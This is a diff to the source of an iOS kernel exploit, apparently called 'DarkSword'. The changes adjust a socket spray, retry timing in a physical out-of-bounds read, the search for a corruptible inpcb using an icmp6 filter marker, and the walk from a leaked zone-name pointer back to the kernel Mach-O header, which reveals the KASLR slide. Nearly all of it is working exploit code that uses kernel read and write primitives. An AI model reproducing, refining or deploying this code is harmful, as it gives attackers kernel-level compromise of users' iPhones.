@@ -275,8 +275,10 @@ bool scan_freed_pages(void *buf, mach_vm_size_t size) {
 }
 
 fileport_t spray_socket(void) {
+    pthread_set_qos_class_self_np(QOS_CLASS_BACKGROUND, 0);
     int fd = socket(AF_INET6, SOCK_DGRAM, IPPROTO_ICMPV6);
-    if (fd < 0) return -1;
+    if (fd < 0) { pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0); return -1; }
+    pthread_set_qos_class_self_np(QOS_CLASS_USER_INITIATED, 0);
     fileport_t port = 0;
     fileport_makeport(fd, &port);
     close(fd);
@@ -323,9 +325,10 @@ kern_return_t phys_oob_read(mach_port_t memObj, mach_vm_offset_t memOff,
                 successReadCount++;
                 if (t > highestSuccessIdx) highestSuccessIdx = t;
                 break;
+            } else {
+                usleep(1);
             }
         }
-        usleep(1);
         if (t == 500) break;
     }
     targetObject = 0;
@@ -436,18 +439,38 @@ void kwrite_buf(uint64_t where, void *buf, size_t size) {
     }
 }
 
+// reverse memmem: search needle backward from the END of haystack window [0, haystack_len)
+static void *reverse_memmem(const void *haystack, size_t haystack_len, const void *needle, size_t needle_len) {
+    if (needle_len == 0) return (void *)haystack;
+    if (haystack_len < needle_len) return NULL;
+    const unsigned char *h = (const unsigned char *)haystack;
+    for (size_t i = haystack_len - needle_len + 1; i-- > 0;) {
+        if (memcmp(h + i, needle, needle_len) == 0) return (void *)(h + i);
+    }
+    return NULL;
+}
+
 int find_and_corrupt_socket(mach_port_t memObj, mach_vm_offset_t seekOff,
                              void *rBuf, void *wBuf, NSMutableArray *usedGc, bool doRead) {
     if (doRead) phys_oob_read_retry(memObj, seekOff, OOB_SIZE, OOB_OFFSET, rBuf);
+    // ClearSword matching: the default icmp6_filter is NOT all-ones on iOS 18;
+    // inpcb + icmp6filt + 8 holds 0x0000ffffffffffff (filter low bits + inp6_cksum/hops).
+    // Locate it BEFORE the executableName oracle, derive the exact inpcb base.
+    uint64_t corruptedFilterMarker = 0x0000ffffffffffff;
     int si = 0; bool found = false; uint64_t pso = 0;
     void *hit;
     do {
         hit = memmem(rBuf + si, OOB_SIZE - si, executableName, strlen(executableName));
         if (hit) {
-            pso = (uint64_t)hit - (uint64_t)rBuf & 0xFFFFFFFFFFFFFC00;
-            if (*(uint64_t*)((uintptr_t)rBuf + pso + OFFSET_ICMP6FILT + 8)) {
-                found = true;
-                break;
+            uint64_t foundOff = (uint64_t)hit - (uint64_t)rBuf;
+            void *filterHit = reverse_memmem(rBuf, foundOff, &corruptedFilterMarker, sizeof(corruptedFilterMarker));
+            if (filterHit) {
+                uint64_t filterOff = (uint64_t)filterHit - (uint64_t)rBuf;
+                if (filterOff >= OFFSET_ICMP6FILT + 8) {
+                    pso = filterOff - (OFFSET_ICMP6FILT + 8);
+                    found = true;
+                    break;
+                }
             }
         }
         si += 0x400;
@@ -1352,7 +1375,7 @@ bool run_darksword(void) {
                 VM_PROT_DEFAULT, &memObj, 0);
             surface_mlock(sma, searchSize);
 
-            for (mach_vm_offset_t so = 0; so < searchSize; so += PAGE_SIZE) {
+            for (mach_vm_offset_t so = 0; so <= searchSize - pcSize; so += PAGE_SIZE) {
                 if (phys_oob_read(memObj, so, OOB_SIZE, OOB_OFFSET, rBuf) == KERN_SUCCESS) {
                     if (find_and_corrupt_socket(memObj, so, rBuf, wBuf, usedGc, false) == 0) {
                         ok = true;
@@ -1399,16 +1422,20 @@ bool run_darksword(void) {
         kread64(rsa + OFFSET_SOCKET_SO_COUNT) + 0x0000100100001001ULL);
     kwrite64(rwSocketPcb + OFFSET_ICMP6FILT + 8, 0);
 
-    uint64_t sp = kread64(controlSocketPcb + OFFSET_PCB_SOCKET);
-    uint64_t pp = kread64(sp + OFFSET_SO_PROTO);
-    uint64_t tp = __xpaci(kread64(pp + OFFSET_PR_INPUT));
-    gKernelBase = tp & 0xFFFFFFFFFFFFC000;
+    // kernel base via inpcbinfo zone name (wh1te4ever / ClearSword, iOS 18 verified)
+    uint64_t pcbinfo = kread64(controlSocketPcb + 0x38);
+    uint64_t ipiZone = kread64(pcbinfo + 0x68);
+    uint64_t zvName = kread64(ipiZone + 0x10);
+    uint64_t kb = zvName & 0xFFFFFFFFFFFFC000;
     while (1) {
-        uint64_t magic = kread64(gKernelBase);
-        if ((magic & 0xFFFFFFFFFFFFFF) == 0x100000cfeedfacf &&
-            kread64(gKernelBase + 8) == 0xc00000002) break;
-        gKernelBase -= PAGE_SIZE;
+        uint64_t magic = kread64(kb);
+        if (magic == 0x100000cfeedfacf) {
+            uint64_t hdr = kread64(kb + 8);
+            if (hdr == 0xc00000002 || hdr == 0xb00000000) break;
+        }
+        kb -= PAGE_SIZE;
     }
+    gKernelBase = kb;
     gKernelSlide = gKernelBase - 0xfffffff007004000ULL;
     printf("[+] KASLR slide: 0x%llx\n", gKernelSlide);
 
